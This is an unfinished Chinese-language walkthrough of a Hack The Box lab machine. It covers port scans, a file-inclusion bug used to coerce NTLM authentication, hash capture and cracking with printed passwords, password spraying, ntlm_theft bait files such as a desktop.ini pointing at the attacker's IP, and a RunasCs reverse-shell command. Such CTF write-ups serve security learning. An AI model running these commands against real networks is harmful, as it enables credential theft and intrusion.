# 扫描

```shell
> sudo nmap --min-rate 10000 -p- 10.10.11.187
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 11:36 CST
Nmap scan report for 10.10.11.187
Host is up (0.24s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49694/tcp open  unknown
49721/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.29 seconds

> sudo nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49694,49721 10.10.11.187
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 11:37 CST
Nmap scan report for 10.10.11.187
Host is up (0.39s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-01 10:37:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-08-01T10:38:28
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.29 seconds

> sudo nmap --script=vuln -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49694,49721 10.10.11.187
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 11:39 CST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.187
Host is up (0.40s latency).

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
|_http-trace: TRACE is enabled
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-sql-injection:
|   Possible sqli for queries:
|     http://10.10.11.187:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=M%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/ie6_warning/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/ie6_warning/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/ie6_warning/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/ie6_warning/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.11.187:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
|_    http://10.10.11.187:80/js/?C=S%3BO%3DD%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1'
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.52 (win64) openssl/1.1.1m php/8.1.1'
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.11.187
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://10.10.11.187:80/
|     Form id: form_1
|     Form action: #
|
|     Path: http://10.10.11.187:80/index.html
|     Form id: form_1
|_    Form action: #
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49694/tcp open  unknown
49721/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 352.62 seconds
```

# smbclient rpcclient

以往学到的，首先尝试有无泄漏的文件信息

略微查看了一下，啥都没有

```shell
> smbclient -L 10.10.11.187
Password for [WORKGROUP\tel]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

> rpcclient -U "" -N 10.10.11.187
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
```

# 80 443 http

开启了 http 服务，只能先从这里开日了，扫扫扫

**子域名爆破**

```shell
wfuzz -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069
ffuf -u "http://flight.htb" -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
```

**目录爆破**

```shell
feroxbuster -u http://flight.htb -x html,php
feroxbuster -u http://school.flight.htb -x html,php
```

`school.flight.htb` 存在文件包含漏洞，但是是 windows 靶机，正常测试 /etc/passwd 没有效果，测试一下 `C:/windows/system32/drivers/etc/hosts` 可以出现回显

尝试使用远程文件，可以看到是使用的 `filt_get_contents` 进行读取的，测试一下 php filter 发现 filter 关键字被过滤

`view-source:http://school.flight.htb/index.php?view=index.php`

```php
<?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
    <div id="tagline">
      <div>
        <h4>Cum Sociis Nat PENATIBUS</h4>
        <p>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.</p>
      </div>
    </div>
<?php } ?>
  </div>
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE);

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}

?>
```

# 文件包含 SMB 获取 hash

另一种包含文件的方法是通过 SMB。  
当进行连接 `\\IP\share`，用户会尝试进行身份验证，并且可以捕获 NetNTLMv2 质询/响应，获取到那个用户的 hash

**启动 responder，然后让靶机访问 `//10.10.16.2/tel` 从而发起 [UNC 连接](https://learn.microsoft.com/zh-cn/dotnet/standard/io/file-path-formats#unc-paths)，靶机将必须进行身份验证才能访问我们指定的共享。工具则会截取中间过程进行身份验证的 hash**

[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

```shell
> sudo responder -I tun0 -wPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
......
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.2]
    Responder IPv6             [dead:beef:4::1000]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-I2I8OSGM98P]
    Responder Domain Name      [KGAC.LOCAL]
    Responder DCE-RPC Port     [46369]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:5e3de8e11c3a01b3:CEE6B73EB541E21B8304E99371B9CBF8:010100000000000000A9815076C4D9014ACD33AB86B11D7B00000000020008004B0047004100430001001E00570049004E002D0049003200490038004F00530047004D0039003800500004003400570049004E002D0049003200490038004F00530047004D003900380050002E004B004700410043002E004C004F00430041004C00030014004B004700410043002E004C004F00430041004C00050014004B004700410043002E004C004F00430041004C000700080000A9815076C4D901060004000200000008003000300000000000000000000000003000005BCE3D6819806C3F91576BA4B09212625468948F8D9465132827990EEC489B5A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000
```

测了一下，这个功能也可以作为蜜罐使用，开启 responder 之后，kali 中使用 smbclient 连接自己，填一个密码，另一边便可以收到 hash，进行爆破得出填入的密码是啥

![](https://pic.l1nyz-tel.cc/202308011300951.png)

john 爆破密码

```shell
> john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)
1g 0:00:00:03 DONE (2023-08-01 12:49) 0.2724g/s 2906Kp/s 2906Kc/s 2906KC/s SADSAM..Ryanelkins
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

# SMB svc_apache

尝试 evil-winrm 连接，但是没有成功，crackmapexec 提示说可以用来进一步访问 smb 共享服务

```shell
> sudo evil-winrm -i flight.htb -u svc_apache -p 'S@Ss!K@*t13'

> sudo crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13'
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13

> smbclient -L 10.10.11.187 --user=svc_apache
Password for [WORKGROUP\svc_apache]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shared          Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
        Web             Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

> smbmap -H flight.htb -u svc_apache -p 'S@Ss!K@*t13'
[+] IP: flight.htb:445  Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
        Web                                                     READ ONLY
```

尝试了一下，可以列出文件，但是无法进行交互，也就没法下载下来，同时，也没有 Web 目录的写权限

# lookupsid

通过 `[MS-LSAT] MSRPC` 接口的 `Windows SID bruteforcer` 示例，旨在查找远程用户/组（获取远程目标系统的所有用户及组信息）

crackmapexec 也可以，但是没有 lookupsid 爆破 安全标识符 (SID) 获取的更全面

```shell
> python3 /tools/impacket/examples/lookupsid.py 'svc_apache:S@Ss!K@*t13@flight.htb'
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[*] Brute forcing SIDs at flight.htb
[*] StringBinding ncacn_np:flight.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: flight\Administrator (SidTypeUser)
501: flight\Guest (SidTypeUser)
502: flight\krbtgt (SidTypeUser)
512: flight\Domain Admins (SidTypeGroup)
513: flight\Domain Users (SidTypeGroup)
514: flight\Domain Guests (SidTypeGroup)
515: flight\Domain Computers (SidTypeGroup)
516: flight\Domain Controllers (SidTypeGroup)
517: flight\Cert Publishers (SidTypeAlias)
518: flight\Schema Admins (SidTypeGroup)
519: flight\Enterprise Admins (SidTypeGroup)
520: flight\Group Policy Creator Owners (SidTypeGroup)
521: flight\Read-only Domain Controllers (SidTypeGroup)
522: flight\Cloneable Domain Controllers (SidTypeGroup)
525: flight\Protected Users (SidTypeGroup)
526: flight\Key Admins (SidTypeGroup)
527: flight\Enterprise Key Admins (SidTypeGroup)
553: flight\RAS and IAS Servers (SidTypeAlias)
571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
572: flight\Denied RODC Password Replication Group (SidTypeAlias)
1000: flight\Access-Denied Assistance Users (SidTypeAlias)
1001: flight\G0$ (SidTypeUser)
1102: flight\DnsAdmins (SidTypeAlias)
1103: flight\DnsUpdateProxy (SidTypeGroup)
1602: flight\S.Moon (SidTypeUser)
1603: flight\R.Cold (SidTypeUser)
1604: flight\G.Lors (SidTypeUser)
1605: flight\L.Kein (SidTypeUser)
1606: flight\M.Gold (SidTypeUser)
1607: flight\C.Bum (SidTypeUser)
1608: flight\W.Walker (SidTypeUser)
1609: flight\I.Francis (SidTypeUser)
1610: flight\D.Truff (SidTypeUser)
1611: flight\V.Stevens (SidTypeUser)
1612: flight\svc_apache (SidTypeUser)
1613: flight\O.Possum (SidTypeUser)
1614: flight\WebDevs (SidTypeGroup)

> sudo crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
SMB         flight.htb      445    G0               [+] Enumerated domain user(s)
SMB         flight.htb      445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: Helpdesk
SMB         flight.htb      445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: Service Apache web
SMB         flight.htb      445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: Secretary
SMB         flight.htb      445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: Project ManagerSMB         flight.htb      445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: Nobody knows why he's here
SMB         flight.htb      445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: Payroll officerSMB         flight.htb      445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: Senior Web Developer
SMB         flight.htb      445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: Sysadmin
SMB         flight.htb      445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: Penetration tester
SMB         flight.htb      445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: Sales manager
SMB         flight.htb      445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: HR Assistant
SMB         flight.htb      445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: Junion Web Developer
SMB         flight.htb      445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         flight.htb      445    G0               flight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         flight.htb      445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

# 密码重用攻击

在真实环境中，服务帐户的负责人重复使用该服务帐户的密码的情况并不罕见。

获取到这些用户，可以进行密码重用，检测是否可以获取到其他用户权限

```shell
> crackmapexec smb flight.htb -u ./users -p 'S@Ss!K@*t13' --continue-on-success
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
```

# S.Moon

smb 共享目录中，Shared 目录多了 WRITE 权限

```shell
> smbmap -H flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13'
[+] IP: flight.htb:445  Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Shared                                                  READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
        Web                                                     READ ONLY
```

Shared 目录存在写权限，应该如何进一步利用呢

# ntlm_theft

因为是 Shared 目录，说明其他用户的 smb 开放中也会有这一个文件夹  
同时，windows 中文件夹内如果存在某一个文件，那么会自动执行某一些操作  
这些文件可能指向**资源共享网络，从而迫使机器到 身份验证以访问资源**

ntlm_theft 工具可以仅通过访问文件夹来创建几个文件，用于窃取用户的 NTLMV2 哈希

这里和前面获取 svc_apache 用户一样，重新开启一个 responder 服务

然后创建 `desktop.ini`，写入

```ini
[.ShellClassInfo]
IconResource=//10.10.16.2/test
```

我们可以使用工具 ntlm_theft 来更好的完成得知写入那一个文件更好

```shell
> python3 /tools/ntlm_theft/ntlm_theft.py -g all -s 10.10.16.2 --filename flight
Created: flight/flight.scf (BROWSE TO FOLDER)
Created: flight/flight-(url).url (BROWSE TO FOLDER)
Created: flight/flight-(icon).url (BROWSE TO FOLDER)
Created: flight/flight.lnk (BROWSE TO FOLDER)
Created: flight/flight.rtf (OPEN)
Created: flight/flight-(stylesheet).xml (OPEN)
Created: flight/flight-(fulldocx).xml (OPEN)
Created: flight/flight.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: flight/flight-(includepicture).docx (OPEN)
Created: flight/flight-(remotetemplate).docx (OPEN)
Created: flight/flight-(frameset).docx (OPEN)
Created: flight/flight-(externalcell).xlsx (OPEN)
Created: flight/flight.wax (OPEN)
Created: flight/flight.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: flight/flight.asx (OPEN)
Created: flight/flight.jnlp (OPEN)
Created: flight/flight.application (DOWNLOAD AND OPEN)
Created: flight/flight.pdf (OPEN AND ALLOW)
Created: flight/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: flight/Autorun.inf (BROWSE TO FOLDER)
Created: flight/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

将所有标注为 **(BROWSE TO FOLDER)** 上传到 Shared 目录中，另一边 responder 等待 hash 的回显

![](https://pic.l1nyz-tel.cc/202308011422159.png)

```shell
> john -w=/usr/share/wordlists/rockyou.txt hash-c.bum
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)
1g 0:00:00:04 DONE (2023-08-01 14:22) 0.2237g/s 2357Kp/s 2357Kc/s 2357KC/s TinyMutt69..Thehunter22
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

# Shell

evil-winrm 还是无法登陆，再看看 smb 权限吧

```shell
> smbmap -H flight.htb -u 'C.Bum' -p 'Tikkycoll_431012284'
[+] IP: flight.htb:445  Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Shared                                                  READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
        Web                                                     READ, WRITE
```

这一个用户，就可以直接看到 user flag，拿下

![](https://pic.l1nyz-tel.cc/202308011433965.png)

同时 Web 目录多了个可写权限，那么，我们进行写马，从 Web 端再将他拿下

搞个 msf 马子给他上线一下

![](https://pic.l1nyz-tel.cc/202308011446471.png)

# 权限提升

获取 shell，低权限的 svc_apache，查看了一遍

端口 8000 之前没有见过，是开放在内网的另一个网站

```shell
C:\xampp\htdocs\flight.htb>netstat -ano | findstr LISTENING
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
```

# C.Bum Shell

[RunasCs](https://github.com/antonioCoco/RunasCs)  
Runas 允许用户用其他权限运行指定的工具和程序

之前已经知道了 C.Bum 账号密码，则可以利用这一个工具进行横向移动，反弹出另一个 shell

```shell
.\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.16.2:1234
```

---

卡爆了，不做了，根据图片查询我此刻的精神状态

![](https://pic.l1nyz-tel.cc/202308011533805.png)

我精神状态很好呀（彻底疯狂、、、
